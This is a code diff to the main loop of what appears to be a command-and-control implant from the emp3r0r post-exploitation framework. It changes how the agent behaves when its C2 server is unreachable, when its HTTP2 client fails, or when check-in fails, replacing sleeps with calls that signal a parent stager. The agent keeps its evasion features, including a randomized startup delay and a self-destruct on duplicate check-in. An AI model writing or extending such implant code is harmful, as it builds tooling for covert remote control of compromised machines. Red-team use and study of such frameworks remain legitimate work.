@@ -52,19 +52,6 @@ func agent_main() {
 	}
 	util.SetFileCryptoKey([]byte(common.RuntimeConfig.Password))
 
-	// if run by stager, patch util.TakeASnap to trigger exit(0)
-	if common.RuntimeConfig.IsRunByStager {
-		logging.Infof("Agent is run by a stager, patching util.TakeASnap to trigger exit(0)")
-		origTakeASnap := util.TakeASnap
-		util.TakeASnap = func(forceSleep bool) {
-			if forceSleep {
-				origTakeASnap(forceSleep)
-			} else {
-				conditionalC2FailNotify()
-			}
-		}
-	}
-
 	if !is_dll {
 		// don't be hasty
 		time.Sleep(time.Duration(util.RandInt(3, 10)) * time.Second)
@@ -199,8 +186,8 @@ func agent_main() {
 	// ────────────────────────────────────────────────────────────────────────────
 	if !common.RuntimeConfig.IsP2PEnabled || common.RuntimeConfig.IsDirectC2Enabled {
 		for !isC2Reachable() {
-			logging.Infof("[-] C2 unreachable, retrying...")
-			util.TakeASnap(false)
+			logging.Infof("[-] C2 unreachable, signaling parent and retrying...")
+			conditionalC2FailNotify()
 		}
 	}
 
@@ -222,8 +209,8 @@ connect:
 	if !isSilentNode {
 		def.HTTPClient = transport.CreateEmp3r0rHTTPClient(def.CCAddress, common.RuntimeConfig.C2TransportProxy)
 		if def.HTTPClient == nil {
-			logging.Infof("[-] Failed to create HTTP2 client, sleeping, will retry later")
-			util.TakeASnap(false)
+			logging.Infof("[-] Failed to create HTTP2 client, signaling parent and retrying")
+			conditionalC2FailNotify()
 			goto connect
 		}
 	} else if def.HTTPClient == nil {
@@ -253,8 +240,8 @@ connect:
 			if strings.Contains(err.Error(), "self-destruct") {
 				logging.Fatalf("Duplicated checkin, self-destructing...")
 			}
-			logging.Infof("CheckIn error: %v, sleeping, will retry later", err)
-			util.TakeASnap(false)
+			logging.Infof("CheckIn error: %v, signaling parent and retrying", err)
+			conditionalC2FailNotify()
 			goto connect
 		}
 		logging.Infof("Checked in on CC: %s", def.CCAddress)
